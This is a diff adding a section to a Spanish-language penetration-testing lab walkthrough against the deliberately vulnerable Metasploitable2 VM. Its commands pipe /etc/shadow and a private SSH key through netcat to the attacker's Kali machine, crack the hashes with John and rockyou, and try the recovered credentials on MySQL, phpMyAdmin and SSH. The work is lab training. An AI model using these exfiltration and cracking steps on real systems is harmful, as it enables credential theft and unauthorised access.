@@ -426,7 +426,7 @@ cat /etc/shadow
 ```
 (solo accesible como root)
 
-2. Cuentas y contraseñas en /etc/passwd ya las tenemos, pero las cruzaremos después con /etc/shadow.
+Cuentas y contraseñas en /etc/passwd ya las tenemos, pero las cruzaremos después con /etc/shadow.
 
 Salida por consola:
 
@@ -2628,6 +2628,193 @@ Binary file /usr/lib/jvm/java-6-openjdk/jre/lib/security/cacerts matches
 /etc/phpmyadmin/config-db.php:$dbpass='password';
 /etc/phpmyadmin/config-db.php:$dbpass='password';
 /etc/phpmyadmin/config-db.php:$dbpass='password';
+
+#### ✅ Resumen de credenciales potenciales encontradas:
+
+- phpMyAdmin → Usuario desconocido, contraseña: password
+
+- MySQL → Usuarios: msfadmin, user (contraseña no encontrada, pero intentar password)
+
+- SSH → Clave privada /home/msfadmin/.ssh/id_rsa
+
+- Hashes locales → root, postgres, user, pentester, etc.
+
+### Documentación, recopilación y preparación entorno Kali con la información obtenida anteriormente
+
+#### 1. Preparamos carpeta en Kali Linux
+
+Ejecutamos en la terminal de Kali:
+
+```bash
+# crea carpeta para este servicio (VNC)
+mkdir -p ~/Pentesting/Metasploitable2/11-vnc
+cd ~/Pentesting/Metasploitable2/11-vnc
+```
+
+Explicación: Aquí guardaremos todos los ficheros y salidas de esta sesión.
+
+#### 2. Transferir /etc/passwd y /etc/shadow (De la víctima → Kali)
+
+- En Kali (listener)
+
+Abrimos la terminal en Kali y ejecutamos:
+
+```bash
+KALI_IP=192.168.56.101 # Recuerda cambiar la ip de Kali si tienes otra diferente
+PORT=9001
+nc -lvnp $PORT > etc_files.tar.gz
+# esperamos sin pulsar nada, ahora ve a la víctima y lanza el tar|nc
+````
+
+- En la víctima (sesión root en VNC)
+
+En la shell root de la víctima, lanzamos:
+
+```bash
+tar czf - /etc/passwd /etc/shadow | nc 192.168.56.101 9001
+```
+
+- Cuando terminemos, volvemos a Kali y extraemos:
+
+```bash
+tar xzvf etc_files.tar.gz
+ls -l passwd shadow
+```
+
+Explicación:
+
+**tar czf - /etc/passwd /etc/shadow** empaqueta y escribe por stdout;nc lo manda a Kali. Así evitamos problemas con SCP/SSH y transferimos rápidamente.
+
+#### 3. Creamos el unshadow y preparamos el archivo para crackear
+
+Con **unshadow** combinamos /etc/passwd y /etc/shadow en un formato que la herramienta John entenderá:
+
+```bash
+unshadow passwd shadow > unshadowed.txt
+ls -l unshadowed.txt
+head -n 5 unshadowed.txt
+```
+
+Explicación:
+
+- /etc/passwd contiene usuarios y campos, /etc/shadow los hashes; unshadow fusiona para que john pueda trabajar.
+
+#### 4. Cracking con John en Kali
+
+Ejecutamos John con rockyou:
+
+```bash
+# prueba rápida con rockyou (si es grande, tardará)
+john --wordlist=/usr/share/wordlists/rockyou.txt --rules unshadowed.txt
+
+# si quieres ver estado:
+john --status
+O pulsamos cualquier tecla lo que nos muestra el progreso
+
+# después de un rato, muestra las contraseñas encontradas:
+john --show unshadowed.txt > cracked.txt
+cat cracked.txt
+```
+
+Opciones:
+
+- **--rules**: aplica transformaciones útiles.
+- Si John detecta que las hashes son tipo md5crypt y se queja, fuerza el formato:
+
+```bash
+john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt
+```
+
+Si John no saca nada rápido, podemos:
+
+- Usar un wordlist pequeño (ejemplo: top 100)
+- Intentar Hashcat (si GPU lo permite)
+- Probar john --incremental (brute-force, puede tardar muchísimo)
+
+#### 4. Transferimos id_rsa privado y probamos (si existe)
+
+Como encontramos /home/msfadmin/.ssh/id_rsa lo llevamos a nuestro Kali y probamos:
+
+- En kali (listener):
+
+```bash
+nc -lvnp 9002 > id_rsa
+chmod 600 id_rsa
+ls -l id_rsa
+```
+
+En la shell victima (root shell):
+
+```bash
+nc 192.168.56.101 9002 < /home/msfadmin/.ssh/id_rsa
+```
+
+En Kali de nuevo:
+
+```bash
+# prueba la clave (si la clave requiere passphrase, te pedirá)
+ssh -i id_rsa msfadmin@192.168.56.102
+# si falla por HostKeyAlgorithms, usa:
+ssh -i id_rsa -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.56.102
+```
+
+Explicación: 
+
+- Si id_rsa es válida y autorizada, nos dará una shell sin contraseña. Muy útil para movernos como msfadmin por el sistema.
+
+Salida consola:
+
+┌──(javier㉿kali)-[~/Pentesting/Metasploitable2/11-vnc]
+└─$ ssh -i id_rsa -oHostKeyAlgorithms=+ssh-rsa -oPubkeyAcceptedKeyTypes=+ssh-rsa msfadmin@192.168.56.102
+msfadmin@192.168.56.102's password: 
+
+#### 5. Probar credenciales encontradas en MySQL / phpMyAdmin / SSH
+
+5.a MySQL (Kali)
+
+Si hemos encontrado contraseñas crackeadas o la contraseña password (phpMyAdmin), probamos:
+
+```bash
+# prueba msfadmin (si tienes password crackeada, sustituye POR_TU_PASS)
+mysql -h 192.168.56.102 -u msfadmin -p
+# cuando pregunte, pega la contraseña
+```
+
+U optamos por conexión directa con password en la línea (evitar en producción pero está bien para laboratorios):
+
+```bash
+mysql -h 192.168.56.102 -u root -p'password'
+```
+
+5.b phpMyAdmin(web)
+
+Abre en tu navegador:
+http://192.168.56.102/phpmyadmin/
+Prueba usuario root o msfadmin y contraseña password (o las que hayas quebrado).
+
+5.c SSH reintentos
+
+Si John obtuvo pares usuario:pass, prueba:
+
+```bash
+ssh msfadmin@192.168.56.102
+# o
+ssh root@192.168.56.102
+```
+
+#### 6. Guardamos los reportes y evidencias en Kali:
+
+Guardamos salidas importantes con ***timestamp:***
+
+```bash
+date > evidence_timestamp.txt
+echo "Archivo passwd y shadow transferidos" >> evidence_timestamp.txt
+# ejemplo guardar salida de john
+john --show unshadowed.txt >> cracked.txt
+# mover todo al folder del proyecto
+cp etc_files.tar.gz unshadowed.txt cracked.txt id_rsa ~/Pentesting/Metasploitable2/11-vnc/
+```
+
 
 
 
